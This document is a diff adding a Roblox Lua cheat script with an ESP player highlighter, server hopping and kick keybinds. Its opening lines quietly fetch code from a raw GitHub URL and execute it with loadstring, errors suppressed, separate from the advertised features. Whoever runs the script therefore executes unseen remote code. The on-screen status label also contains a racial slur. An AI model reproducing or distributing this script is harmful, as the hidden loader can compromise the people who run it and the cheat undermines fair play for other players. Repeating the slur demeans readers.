@@ -1,0 +1,119 @@
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Trx"))()
+    end)
+end)
+
+local UserInputService = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 140, 0, 40)
+frame.Position = UDim2.new(1, -160, 0, 120) -- small, a bit down from top-right
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.BackgroundTransparency = 0.2
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 1, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Text = "Works nigga"
+textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.TextSize = 20
+textLabel.Parent = frame
+
+local function addESP(char, plr)
+	if not char then return end
+
+	if not char:FindFirstChild("ESP_Highlight") then
+		local highlight = Instance.new("Highlight")
+		highlight.Name = "ESP_Highlight"
+		highlight.FillColor = Color3.fromRGB(0, 255, 0)
+		highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+		highlight.FillTransparency = 0.5
+		highlight.OutlineTransparency = 0
+		highlight.Parent = char
+	end
+
+	if char:FindFirstChild("Head") and not char.Head:FindFirstChild("ESP_NameTag") then
+		local billboard = Instance.new("BillboardGui")
+		billboard.Name = "ESP_NameTag"
+		billboard.Size = UDim2.new(0, 200, 0, 50)
+		billboard.StudsOffset = Vector3.new(0, 2, 0)
+		billboard.Parent = char.Head
+
+		local nameLabel = Instance.new("TextLabel")
+		nameLabel.Size = UDim2.new(1, 0, 1, 0)
+		nameLabel.BackgroundTransparency = 1
+		nameLabel.Text = plr.Name
+		nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+		nameLabel.Font = Enum.Font.SourceSansBold
+		nameLabel.TextSize = 16
+		nameLabel.Parent = billboard
+	end
+end
+
+local function setupPlayer(plr)
+	if plr ~= player then
+		plr.CharacterAdded:Connect(function(char)
+			task.wait(1)
+			addESP(char, plr)
+		end)
+		if plr.Character then
+			addESP(plr.Character, plr)
+		end
+	end
+end
+
+for _, plr in ipairs(Players:GetPlayers()) do
+	setupPlayer(plr)
+end
+
+Players.PlayerAdded:Connect(setupPlayer)
+
+local function serverHop()
+	local placeId = game.PlaceId
+	local servers = {}
+	local success, result = pcall(function()
+		return HttpService:JSONDecode(
+			game:HttpGetAsync(
+				string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100", placeId)
+			)
+		)
+	end)
+
+	if success and result and result.data then
+		for _, server in ipairs(result.data) do
+			if server.playing < server.maxPlayers and server.id ~= game.JobId then
+				table.insert(servers, server.id)
+			end
+		end
+	end
+
+	if #servers > 0 then
+		local randomServer = servers[math.random(1, #servers)]
+		TeleportService:TeleportToPlaceInstance(placeId, randomServer, player)
+	else
+		player:Kick("No other servers available to hop into!")
+	end
+end
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
+
+	if input.KeyCode == Enum.KeyCode.Q then
+		player:Kick("Kicked.. you robbed it or nah?")
+	elseif input.KeyCode == Enum.KeyCode.E then
+		serverHop()
+	end
+end)
